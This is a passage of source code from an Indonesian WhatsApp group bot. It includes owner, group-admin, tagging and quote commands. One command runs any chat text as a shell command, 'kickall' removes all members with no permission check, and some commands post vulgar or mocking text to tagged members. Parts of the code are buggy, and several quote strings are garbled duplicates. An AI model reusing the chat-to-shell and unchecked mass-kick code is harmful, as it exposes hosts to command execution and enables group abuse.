							fs.unlinkSync(ran)
						})
					}
					break
  case 'clearall':
  if (!isOwner) return  reply(mess.only.owner)
 anu = await kahfzz.chats.all()
  kahfzz.setMaxListeners(25)
  for (let _ of anu) {
 kahfzz.deleteChat(_.jid)
  }
  reply('Sukses delete all chat :)')
  break
  case 'term':
  if (!isOwner) return
 if (!q) return
exec(q, (err, stdout) => {
  if (err) return reply(`${err}`)
 if (stdout) {
reply(stdout)
 }
  })
 break 
 case 'shutdown':
 if (!isOwner) return 
reply(`Bye...`)
 await sleep(3000)
 process.exit()
 break
 case 'restart':
 if (!isOwner) return 
reply(mess.wait)
 exec(`node main`)
 reply('_Restarting Bot Success_')
 break
 case 'leaveall':
 if (!isOwner) return  reply(mess.only.owner)
let totalgroup = kahfzz.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
 for (let id of totalgroup) {
sendMess(id, 'Byee', null)
await sleep(3000)
kahfzz.groupLeave(id)
 }
 break
//------------------< G R U P >-------------------
case 'kick':
case 'kik':
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
  if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
  kick(from, mentionUser)
break
case 'add':
if (kahfz.message.extendedTextMessage === null || kahfz.message.extendedTextMessage === undefined) {
  entah = arg.split("|")[0]
  entah = entah.replace(new RegExp("[()+-/ +/]", "gi"), "")
  entah = `${entah}@s.whatsapp.net`
  kahfzz.groupAdd(from, [entah])
} else {
  entah = kahfz.message.extendedTextMessage.contextInfo.participant
  kahfzz.groupAdd(from, [entah])
}
break
case 'promote':
reply ('sukses promote admin')
mentioned = kahfz.message.extendedTextMessage.contextInfo.participant

if (mentioned.length !== 0){
 kahfzz.groupMakeAdmin(from, mentioned)
 .then((res) => reply(jsonformat(res)))
 .catch((err) => reply(jsonformat(err)))
  } else if (isQuotedMsg) {
 kahfzz.groupMakeAdmin(from, [quotedMsg.sender])
 .then((res) => reply(jsonformat(res)))
 .catch((err) => reply(jsonformat(err)))
  } else if (!isNaN(args[1])) {
 kahfzz.groupMakeAdmin(from, [args[1] + '@s.whatsapp.net'])
 .then((res) => reply(jsonformat(res)))
 .catch((err) => reply(jsonformat(err)))
  } else {

 reply(`Kirim perintah ${prefix}promote @tag atau nomor atau reply pesan orang yang ingin di promote`)
  }
  break
  case 'demote': case 'odemote':
  reply('sukses demote admin')
  if (!isGroup) return reply('GROUP ONLY')
 if (command.split(prefix)[1] === 'odemote' && !isPremium) return reply('ONLY PREMIUM')
if (!isGroupAdmins && !isPremium)return reply('ONLY ADMIN')
  mentioned = kahfz.message.extendedTextMessage.contextInfo.participant

if (mentioned.length !== 0){
  kahfzz.groupDemoteAdmin(from, mentioned)
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
} else if (isQuotedMsg) {
  if (quotedMsg.sender === ownerNumber) return reply(`Tidak bisa kick Owner`)
 kahfzz.groupDemoteAdmin(from, [quotedMsg.sender])
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
} else if (!isNaN(args[1])) {
  kahfzz.groupDemoteAdmin(from, [args[1] + '@s.whatsapp.net'])
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
} else {

  reply(`Kirim perintah ${prefix}demote @tag atau nomor atau reply pesan orang yang ingin di demote`)
}
break
case 'linkgc': case 'linkgrup': case 'linkgroup':
if (!isGroup) return reply('ONLY GRUP')
  if (!isBotGroupAdmins) return reply('ONLY OWNER')
 kahfzz.groupInviteCode(from)
  .then((res) => reply('https://chat.whatsapp.com/' + res))
  break
  case 'setgrupname':
  if (!isGroup) return reply(mess.only.group)
 if (!isBotGroupAdmins) return 
if (args.length == 0) return reply(`Penggunaan ${prefix}setgrupname name`)
  kahfzz.groupUpdateSubject(from, q)
.then((res) => reply(jsonformat(res)))
.catch((err) => reply(jsonformat(err)))
break
case 'setdesc':
if (!isGroup) return reply(mess.only.group)
  if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 if (args.length == 0)  return reply(`Penggunaan ${prefix}setdesc desc`)
kahfzz.groupUpdateDescription(from, q)
 .then((res) => reply(jsonformat(res)))
 .catch((err) => reply(jsonformat(err)))
 break
 case "prefix":
 if (!args.length) return reply(`Opsi prefix\n\n- noprefix\n- multi\n\n- oneprefix\n\nExample : ${prefix}prefix noprefix`)
if (args[0] === "multi") {
  multipref = true;
  noprefix = false;
  oneprefix = false;
  reply("berhasil mengubah ke multi prefix")
} else if (args[0] === "noprefix") {
  multipref = false;
  noprefix = true;
  oneprefix = false;
  reply("berhasil mengubah ke no prefix")
} else if (q === "oneprefix") {
  multipref = false;
  noprefix = false;
  oneprefix = true;
  reply(`One prefix untuk saat ini adalah ( ${prefix} ) untuk mengganti prefix ketik ${prefix}setprefix`)
} else {
  reply("pilih multi, noprefix, atau one prefix")
}

break
case "setprefix":
if (!q) return reply("Prefix nya mau apa?")
  multipref = false;
noprefix = false;
oneprefix = true;
preff = q
break
case 'setppgrup':
if (!isGroup) return reply(mess.only.group)
  if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 if (isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kahfz
let media = await kahfzz.downloadMediaMessage(encmedia)
kahfzz.updateProfilePicture(from, media)
.then((res) => reply(jsonformat(res)))
.catch((err) => reply(jsonformat(err)))
 } else {
reply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
 }
 break
 case 'me':
 case 'profile':

 kahfzz.updatePresence(from, Presence.composing)
              try {
               var pic = await kahfzz.getProfilePicture(from)
  } catch {
 var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
 }
              thu = await kahfzz.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
              me = kahfzz.user
              uptime = process.uptime()
              profile = `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${thu.status}\n➸ *Premium*: ${isPremium ? 'Ya' : 'No'}\n➸ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}\n➸ *Prefix :* Multi Prefix\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\nYour progress:\n➸ *Level*: ${Levelnye}\n➸ *XP*: ${Xpluu} / ${requiredXplu}`
              
              kahfzz.sendMessage(from, await getBuffer(pic), image, {quoted: freply, caption: profile, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
 break
 case 'afk': 
 if (!isGroup) return reply(mess.only.group)
if (isAfkOn) return reply('Woe Kalo Mau Afk Jangan Nimbrung di sini')
  const reason = q ? q : 'Nothing.'
afk.addAfkUser(sender, time, reason, _afk)
const aluty = `Fitur AFK berhasil *diaktifkan!*\n\n➸ *Ussername*: ${pushname}\n➸ *Alasan*: ${reason}`
reply(aluty)
break
case 'infogrup':
case 'infogrouup':
case 'grupinfo':
case 'groupinfo':
if (!isGroup) return reply(mess.only.group)
  try {
 var pic = await kahfzz.getProfilePicture(from)
  } catch {
 var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
  }
  let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelkom ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n${groupMetadata.desc}`
  kahfzz.sendMessage(from, await getBuffer(pic), image, {quoted: freply, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
  break
  case 'tagall':
  if (!isGroup) return reply(mess.only.group)
 let arr = [];
  let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
  for (let i of groupMembers){
 txti += `=> @${i.jid.split("@")[0]}\n`
 arr.push(i.jid)
  }
  mentions(txti, arr, true)
  break
case 'kontolcek':
  if (!isGroup) return reply(mess.only.group)
 let arrr = [];
  let txtit = `*[ KONTOL LU SEMUA ]*\n\n${q ? q : ''}\n\n`
  for (let i of groupMembers){
 txtit += `=> @${i.jid.split("@")[0]}\n`
 arrr.push(i.jid)
  }
  mentions(txtit, arrr, true)
  break
 case 'kickall': // Anti Banned
 for (let i of groupMembers) {
  await kickMember(from, [i.jid])
}
break
case 'leavegc':
if (!isOwner) return 
  if (!isGroup) return reply(mess.only.group)
 setTimeout( () => {
kahfzz.groupLeave(from) 
 }, 2000)
  setTimeout( () => {
 reply('Byee...')
  }, 0)
  break
  case 'online':
  case 'listonline':
  case 'here':
  if (!isGroup) return reply(`Only group`)
try {
  let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
  let online = [...Object.keys(kahfzz.chats.get(ido).presences), kahfzz.user.jid]
  kahfzz.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: freply, contextInfo: { mentionedJid: online }})
} catch (e) {
  reply(`${e}`)
}
break
case 'hidetag':
try {
  quotedText = kahfz.message.extendedTextMessage.contextInfo.quotedMessage.conversation
  hideTag(from, `${quotedText}`)
} catch {
  hideTag(from, `${q}`)
}
break
case 'sider':
if(!isGroup) return reply(mess.only.group)
  try {
 infom = await kahfzz.messageInfo(from, kahfz.message.extendedTextMessage.contextInfo.stanzaId)
 tagg = []
 teks = `*• Dibaca oleh:*\n\n`
 for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
 }
 teks += `*• Tersampaikan pada:*\n\n`
 for(let i of infom.deliveries){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
 }
 mentions(teks, tagg, true)
  } catch (e) {
 console.log(color(e))
 reply('Reply chat bot!')
  }
  break
//------------------< Fun >-------------------
case 'wangy':
if (!q) return
  qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
reply(awikwok)
break
case 'quotesislami':
                 if (!isRegistered) return reply('kamu belum daftar')
					const islami =['Hal yang paling manis adalah ketika seseorang menyebutkan nama kamu di tahajjud mereka.','Ya Allah panggillah diriku dan orang tuaku ke baitullah dalam keadaan sehat walafiat.','Ya Allah semoga seseorang yang engkau jodohkan denganku adalah seseorang yang saat ini sedang aku perjuangkan.','Allah tidak pernah tidur. Semua pasti akan di balas kelak. Orang-orang jahat yang sekarang bisa tertawa karena banyak uang, berkuasa, tapi besok-besok mereka semua di balas seadil-adilnya.','Jangan putus asa, Allah tidak akan mengecewakan hambanya yang ingin memperbaiki diri.','Percayalah orang yang menasehatimu untuk sholat adalah dia yang paling mencintaimu.','Bukannya Allah tidak tahu sedihmu, Tapi Allah tahu kalau kamu itu kuat.','Bacalah Al-Quran, Ia akan menenangkan hatimu meskipun engkau tidak memahami artinya.','Saat kita sakit hati sama omongan orang, saat itu juga sebenarnya Allah ngajarin kita buat jaga omongan kita ke orang lain. Sederhana bukan?','Di dunia ini orang paling baik pun bisa dicela, dan bahkan orang paling jahat sekalipun bisa di bela.','Al-Quran adalah teman yang tidak akan mengecewakan kamu di dunia dan akhirat.','Cara Allah menjawab doa hambanya : Iyaa.. aku beri untukmu sekarang. Tunggu, aku ingin melihat dulu perjuanganmu. Tidak, aku punya yang lebih baik untukmu.','Dan Allah tidak akan mengadzab mereka selama mereka mau Memohon ampun kepada-Nya. [Al-Anfaal, 8:33]','Kesabaran itu ada dua macam : Sabar atas sesuatu yang tidak kamu ingin. Sabar menahan diri dari sesuatu yang kamu ingini. -Ali bin Abi Thalib','Ambillah kebenaran, jika kamu telah mendengarnya. Karena sungguh di atas kebenaran ada cahaya. (HR. Abu Daud)','Sholatlah agar hatimu tenang, Istighfarlah agar kecewamu hilang, Berdoalah agar bahagiamu segera datang.','Surga itu mahal.. Akan tetapi orang miskin tetap mampu membelinya, Karena harganya bukan pada Harta melainkan Taqwa.','Ya Allah... Perbaikilah lisanku, Perbaikilah hatiku, Perbaikilah akhlakku, Perbaikilah hidupku, Aamiin..','Semoga hari ini Allah memudahkan setiap urusan kita, melapangkan hati kita serta meringankan langkah kita, dalam kebaikan kita Aamiin.','Peganglah aku, bacalah aku setiap hari, karena aku akan menjadi penerang didalam kuburmu nanti. #Al-Quran','Kematian..Kamu terlalu banyak bercanda. Hingga sampai kamu lupa, kematian mungkin tidak menunggumu selesai tertawa.','Jangan khawatirkan rizkimu, karena Allah telah menjaminnya untukmu, namun khawatirkanlah amalanmu, karena Allah tidak menjamin surga-Nya untukmu..','Wahai orang-orang yang beriman! Ingatlah kepada Allah, Dengan mengingat (nama-Nya) sebanyak-banyaknya dan bertasbihlah kepada-nya pada waktu pagi dan petang.','Aku sangat ingin menjadi pemburu surga. Namun aku lupa bahwa aku juga buronan neraka.','Karena aku percaya apapun yang menjadi milikku akan tetap menjadi milikku. Sejauh apapun dia (mencoba) pergi. Sejauh apapun usaha orang lain ingin merebutnya dariku. Aku hanya perlu percaya pada Allah bahwa yang menjadi milikku tidak akan pernah menjadi milik orang lain.','Andai hidayah itu seperti buah yang bisa kubeli, maka akan kubeli berkeranjang-keranjang untuk aku bagikan kepada orang-orang yang aku cintai.','Bila kamu tidak melihatku di syurga. Tolong tanya kepada Allah dimana aku, Tolonglah aku ketika itu..','Hanya Allah yang mengerti bagaimana sulitnya menahan sabar tanpa harus bercerita panjang lebar.','Letakkan hpmu lalu ambil air wudhu, shalatlah kamu, Allah menunggu curhatan darimu.','Maafin aku Ya Allah Gara gara aku mencintai dia tapi tidak pasti, sampai aku lupa mencintai mu juga.','Akan ada saatnya setelah salam dari sholatku, tanganmu yang pertama kali kusentuh.','Mungkin maksud Tuhan mempertemukan kamu dengannya adalah, sekedar mengingatkan bahwa tidak semua yang kamu inginkan bisa kamu dapatkan.','Percayalah Seorang wanita yang mencintai Allah. Allah akan berikan lelaki terbaik untuk menjaganya.','Berterimakasihlah kepada tuhan, Yang memberimu hidup dan kehidupan.','Mungkin kamu hanya harus sedikit peka untuk menyadari petunjuk dari Tuhan atas doa-doamu.']
					const isl = islami[Math.floor(Math.random() * islami.length)]
					islam = await getBuffer(`https://i.ibb.co/dPnjvD3/IMG-20210127-WA0018.jpg`)
					kahfzz.sendMessage(from, islam, image, { quoted: freply, caption: '*Quotes Islami*\n\n'+ isl })
					 await sleep(7000)
					 txtt =`Hai Kak ${pushname}\nSemoga Jadi Motivasi Untuk Tidak Menyerah Ya Kak Jika Kaka Ingin Quote Lagi Tekan Button Di Bawah Ini Ya Kak🌬️`

 buttons = [{buttonId: noprefix ? "quotesislami" : "!"+"quotesislami",buttonText:{displayText: 'QUOTES ISLAMI SELANJUTNYA'},type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Semoga Menjadi Motivasi',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
					break
case 'cekbapak': // By Ramlan ID
					const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Kahfz Botz', 'Bapak Kok Di Tanah Yahahha']
					const cek = bapak[Math.floor(Math.random() * bapak.length)]
					bapak =  await getBuffer(`https://telegra.ph/file/fb96c83696dfa25aa9e22.jpg`)
					kahfzz.sendMessage(from, bapak, image, { quoted: freply, caption: '*Bapak - Bapak*\n\n'+ cek })
					break
case 'quotesmotivasi':
                  if (!isRegistered) return reply('kamu belum daftar')
					const motiv =['Nilai sebuah tindakan terletak dalam usaha menyelesaikan sampai tuntas','Kebaikan adalah seorang yang matanya penuh perhatian, serta tangannya yang penuh manfaat','Hiduplah seperti kamu akan mati besok, dan berbahagialah seperti kamu akan hidup selamanya','Kita tidak usah saling menyalahkan, agar dimasa depan tak ada yang menuntut akan kesalahan','Ketika semua hal tidak sejalan dengan anda, ingatlah bahwa sebuah pesawat terbang melawan angin, bukan dengan mengikuti angin','Belajarlah menikmati apa yang kamu miliki, itu akan membuat hidupmu lebih bernilai','Selalu ada kegelapan yang tergelap sebelum terbitnya fajar','Sahabat itu seperti bintang, tak selalu Nampak tetapi selalu ada dihati','Sibuk bukanlah jaminan karir karena hasil jauh lebih didengar orang','semua kemajuan tidak akan ada tanpa kesalahan, kesalahan adalah bagian dari kemajuan selama diakui dan diperbaiki','Sukses meninggalkan jejak, gagal meninggalkan pelajaran, diam meninggalkan penyesalan','Keraguan bersahabat dekat dengan kegagalan','uang tidak merusak seseorang, keserakahan lah yang merusak manusia','Kepercayaan tidak bisa dibeli, tapi kepercayaan bisa dipelihara','Impian, target, kemauan dan tujuan semuanya sia-sia tanpa tindakan','usia bisa berbohong tapi kedewasaan tidak','Ada yang lebih berharga dari uang dan emas yaitu waktu','Tidak ada yang gagal mereka hanya berhenti terlalu cepat','Terasa sakit selalu hampir tidak ada rasanya setelah apa yang kita perjuangkan tercapai','Seseorang tidak bisa sukses seringkali karena kurangnya keberanian untuk mencobaterasa sakit selalu hampir tidak ada rasanya setelah apa yang kita perjuangkan tercapai','Bicaralah secukupnya, lakukanlah semampunya. Jangan melakukan sebaliknya','Ada saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','jangan takut karena masalah yang anda hadapi tidak lebih besar dari jalan keluarnya, Allah siapkan bagi andaAda saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','Kadang cara terbaik untuk Memanfaatkan peluang adalah dengan mengatakan tidak pada peluang baru dan fokus mengembangkan apa yang sudah ada di tanganjangan takut karena masalah yang anda hadapi tidak lebih besar dari jalan keluarnya, Allah siapkan bagi andaAda saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','atasan hanya memberikan tugas berat pada karyawan terbaik, Allah hanya memberikan ujian pada pada manusia terbaikKadang cara terbaik untuk Memanfaatkan peluang adalah dengan mengatakan tidak pada peluang baru dan fokus mengembangkan apa yang sudah ada di tanganjangan takut karena masalah yang anda hadapi tidak lebih besar dari jalan keluarnya, Allah siapkan bagi andaAda saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','berusaha dan gagal Ternyata jauh lebih melegakan daripada pasrah melihat ke kanan dengan tangan terlipat','lewat kesulitan lah manusia belajar, lewatnya kenyamanan lah manusia Terlena','Saat kita merasa hebat kita baru saja kehilangan separuh pangkat kita karena lengah untuk terus belajar','hidup seseorang telah ditebak, tapi Nasib orang malas mudah untuk ditebak','Orang pintar itu biasa orang hebat itu luar biasa tapi orang berani lah pemenangnyahidup seseorang telah ditebak, tapi Nasib orang malas mudah untuk ditebak','Orang hebat membicarakan ide, orang menengah membicarakan pengalaman, orang lemah membicarakan orang lainOrang pintar itu biasa orang hebat itu luar biasa tapi orang berani lah pemenangnyahidup seseorang telah ditebak, tapi Nasib orang malas mudah untuk ditebak','Anda tidak akan mengubah kehidupan sampai anda mengubah Apa yang anda lakukan setiap hari','bertahan saja tidak cukup anda perlu bereaksi terhadap tekanan dan merubah keadaan','masa depan kita tergantung pada apa yang kita lakukan pada saat ini. Maka jangan sia-siakan waktumu sekarang','Nilai manusia ditentukan bukan dari apa yang diperoleh melainkan apa yang telah diberikan','Malas adalah kemenangan saat ini dan kekalahan di masa nanti','sebuah masalah merupakan kesempatan bagi anda untuk mengeluarkan kemampuan terbaik anda','Kematian tidak dapat mengubur perbuatan baik seseorang','Asal percaya dengan sungguh-sungguh apapun keyakinan Anda dapat menjadi kenyataan','Jika ada hari buruk maka pasti akan hari ada hari baik tugas kita adalah terus bergerak majuAsal percaya dengan sungguh-sungguh apapun keyakinan Anda dapat menjadi kenyataan','Mengeluh adalah cara paling buruk dalam menyelesaikan masalah','Tetap Bertahan dan setia pada tujuan saat menghadapi Hambatan adalah kunci kesuksesan','Tidak perlu keahlian khusus untuk mencari musuh, tapi perlu kesetiaan untuk mempertahankan teman','Orang tua bukan hanya punya kekuatan untuk menatap juga untuk mengalah','Keuletan adalah tanda jadi kesuksesan','cepat atau lambat mereka yang menang adalah mereka yang berfikir dan yakin bahwa mereka bisa','Jaga terus Api Harapan Anda seperti menjaga hidup anda sendiri','Saat semua jalan tertutup. Buatlah jalan dan berserahlah kepada Allah','lari dari masalah bukanlah penyelesaian masalah, hadapi dan Belajarlah dari masalah itu','Rezeki itu ditangan Allah yang kita lakukan hanya berusaha semaksimal mungkin dan menyerahkan hasilnya kepada yang kuasa','Sukses dimulai dengan melakukan apa yang harus dilakukan','rasa syukur membuat kita tidak pernah merasa kekurangan','goal hanya sekedar goal kalau kita tidak mempunyai alasan yang kuat Mengapa kita harus mencapainya','Apapun yang terjadi Yakinlah bahwa Allah menginginkan kita akan jadi lebih baik karena Kejadian ini','orang yang paling Bahagia bukanlah orang yang punya hal-hal terbaik tapi orang yang bisa menjadikan hal-hal yang ia punya menjadi yang terbaikApapun yang terjadi Yakinlah bahwa Allah menginginkan kita akan jadi lebih baik karena Kejadian ini','Respon kita terhadap masalah menentukan kualitas berita fokus pada solusi','Semua yang terlalu sedikit dan terlalu banyak tidak akan membawa kebaikan','Tidak semua usaha kita dibayar oleh manusia, tapi Allah akan membayarnya kelak','Tidak ada harga untuk waktu, tetapi waktu sangat berharga','Sukses seringkali datang pada mereka yang berani bertindak dan jarang menghampiri pada mereka yang dikalahkan ketakutan','Katakan bisa pasti bisa dengan penuh keyakinan otak kita akan segera mencari solusi','Orang yang tidak belajar dari kegagalan adalah orang yang gagal sesungguhnya','Segala sesuatu masalah yang menimpa Anda tidak akan pernah melatih kekuatan anda untuk menyelesaikannya','Saat orang lain melakukan impianmu itu berarti mereka belum mampu melihat sejauh anda melihat','Allah tidak pernah terlambat ia akan menunjukkan kuasanya, pada detik terakhir sekalipun','Bukan banyaknya panah yang menentukan kemenangan tapi tajam panah dan tujuannya yang menentukan','Mengeluh itu sisi lain dari pemborosan, pemborosan waktu dan energy','Pikiran negatif sangat berkuasa bila diberi kesempatan, jadi jangan memberinya kesempatan','Cinta akan membuat kita menjadi orang terkaya di dunia, oleh karena itu mulailah mencintai','Cemas yang berlebihan tidak akan mengubah apapun kecuali merusak diri sendiri','Hidup ini sederhana terkadang pikiran manusia yang membuatnya rumit','Siapa yang bisa menerima kelemahannya sesungguhnya baru saja menambah satu kelebihan pada dirinya','Ada saatnya dimana kekalahan rasa manis yaitu Saat anda sudah melakukan yang terbaik','Menabung itu hanya untuk mempertahankan kekayaan, untuk meningkatkannya berinvestasilah','Jika selamanya anda bermain aman, selamanya juga Anda di tempat yang sama','Lari dari masalah akan membuat masalah menjadi lebih besar, menghadapinya akan membuat anda menjadi lebih besar','Yang menyedihkan bukanlah bidikan yang meleset tapi bidikan tanpa target','Hati yang sedang panas menumpulkan logika dinginkan terlebih dahulu sebelum mengambil keputusan','bila ingin hasil yang besar jangan kerjakan hal yang mudah saja','Jangan biarkan impianmu dijajah oleh pendapat orang lain','Mulailah dengan yang kecil, Kerjakanlah dengan cara yang besar adalah dengan cara yang benar','Pengaruh perkataan orang kepada anda 100% adalah atas izin anda sendiri','Bekerjalah dengan ikhlas karena bekerja tanpa paksaan akan memberi hasil maksimal','Suka belajar, suka jualan, hidup hemat, beli aset suka, sedekah adalah 5 resep Makmur','Lebih baik menjadi raja tikus daripada ekor naga','Kerja keras dan kerja cerdas dapat memastikan keberhasilan dan sedekah dapat memudahkannya','Sakit dalam perjuangan itu hanya berlangsung sementara, namun jika anda menyerah rasa sakit itu akan terasa selamanya','Kegagalan terbesar adalah ketika tidak berani mencoba','Langkah pertama yang diperlukan untuk mendapatkan hal yang anda inginkan adalah memutuskan apa yang anda inginkan','Jangan takut menghadapi masa depan, hadapi dan perjuangkanlah','Dahulukan Allah dalam setiap langkah hidupmu maka semuanya akan ditambahkan kepadamu','Kesulitan adalah hujan terbaik untuk menunjukkan kualitas diri yang sebenarnya','Kesalahan dan kegagalan adalah guru terbaik jika kita mau jujur mengakui dan belajar darinya','Diam belum tentu menyelesaikan masalah tapi setidaknya tidak membesarkan masalah','Pemenang sejati selalu memberikan 100% upayanya, bahkan ketika tidak seorang pun melihatnya','Memaafkan orang lain bagai Menyiram air Bara dendam di hati baik untuk kesehatan kita','Jenius adalah 1 inspirasi dan 99 keringat tidak ada yang dapat menggantikan kerja keras','Disiplin memang tidak mudah tapi tanpa kedisiplinan hidup anda akan jauh lebih sulit','Orang yang berhenti belajar akan menjadi pemilik masa lalu, orang yang terus belajar akan menjadi pemilik masa depan','Hujan tidak hanya datang sendirian Ia datang bersama kesejukan, hal buruk tidak datang sendirian ia datang bersama pembelajaran','Menang atau kalah lakukanlah dengan jujur','Lihatlah tantangan sebagai ujian dan lihatlah masalah Sebagai teguran','Lihat ke atas agar terinspirasi lihat ke bawah agar bersyukur','Untuk meraih apa yang benar-benar anda inginkan fokus saja tidak cukup. Anda harus memiliki rasa lapar untuk meraihnya','90% dari kegagalan berasal dari orang-orang yang memiliki kebiasaan membuat alasan-alasan','Allah tidak membenci orang malas, tapi Allah mengizinkan orang rajin mengambil rezeki orang malas','Keajaiban itu nyata bagi mereka yang yakin berserah diri dan bekerja keras','Orang optimis dapat melihat peluang dalam masalah, orang pesimis akan melihat masalah dalam peluangKeajaiban itu nyata bagi mereka yang yakin berserah diri dan bekerja keras','Kualitas pikiran anda menentukan kualitas kehidupan anda','Bersyukur adalah cara ampuh untuk meraih energi yang dahsyat, Sudahkah anda bersyukur hari ini','Jangan mengharapkan sesuatu yang luar biasa jika anda hanya mau melakukan hal yang biasa saja','Kebahagiaan dimulai dengan ketulusan','1000 perkataan dan pengetahuan tidak berarti tanpa adanya satu tindakan yang nyata','Tangkap peluang, kerjakan, selesaikan','Ketika situasi di sekolah Anda tidak menyenangkan. Di saat itulah sebenarnya karakter anda sedang dibentuk','Seorang pemberani bukan orang yang tidak mempunyai rasa takut. Tapi orang yang mampu berjalan diatas rasa takutnya','dalam takut yang tampak adalah hambatan, dalam yakin yang tampak adalah kesempatan','Tidak ada kata gagal yang ada hanya sukses atau perlu belajar lagi sampai berhasil','Menjadi tua itu pasti menjadi dewasa itu pilihan','Kehidupan yang besar dimulai dari mimpi yang besar','Tragedi dalam kehidupan ini bukanlah yang berakhir terlalu cepat, tetapi kita menunggu terlalu lama untuk memulainya','Takut akan kegagalan seharusnya tidak menjadi alasan untuk tidak mencoba sesuatu','Hari ini adalah hari pertama dalam hidup anda. Buatlah hari ini menjadi hari yang terbaik sepanjang hidup anda dan semoga hari esok matahari bersinar dengan terang','Saya berpikir bahwa ada suatu hal yang lebih penting daripada sekedar percaya, tindakan Dunia ini penuh dengan pemimpi ,tidaklah banyak orang yang berani maju ke depan dan Mulai mengambil langkah pasti untuk mewujudkan visi mereka','Anda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Allah, aku tahu bahwa saat aku kehilangan sesuatu engkau sedang mempersiapkan hal yang lebih baik untukkuAnda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Pergilah sejauh mungkin dan ketika anda tiba di sana anda akan melihat lebih jauh lagiAllah, aku tahu bahwa saat aku kehilangan sesuatu engkau sedang mempersiapkan hal yang lebih baik untukkuAnda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Menangis dapat melepaskan tambahan hormon stress, itulah mengapa kita sehabis menangis merasa lebih baikPergilah sejauh mungkin dan ketika anda tiba di sana anda akan melihat lebih jauh lagiAllah, aku tahu bahwa saat aku kehilangan sesuatu engkau sedang 